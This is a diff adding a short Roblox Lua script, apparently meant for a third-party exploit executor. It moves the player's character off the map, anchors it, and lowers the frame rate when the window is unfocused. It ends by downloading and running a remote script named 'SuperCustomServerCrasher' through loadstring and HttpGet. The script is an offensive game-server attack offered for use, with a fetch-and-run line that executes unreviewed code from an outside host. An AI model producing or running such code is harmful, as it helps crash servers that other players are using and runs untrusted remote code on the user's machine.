@@ -1,0 +1,29 @@
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000, 0, 0)
+
+wait(0.20)
+
+local Player = game.Players.LocalPlayer.Character
+Player:FindFirstChild("HumanoidRootPart").Anchored = true
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+local WindowFocusReleasedFunction = function()
+    RunService:Set3dRenderingEnabled(false)
+    setfpscap(10)
+    return
+end
+
+local WindowFocusedFunction = function()
+    RunService:Set3dRenderingEnabled(true)
+    setfpscap(360)
+    return
+end
+
+local Initialize = function()
+    UserInputService.WindowFocusReleased:Connect(WindowFocusReleasedFunction)
+    UserInputService.WindowFocused:Connect(WindowFocusedFunction)
+    return
+end
+Initialize()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
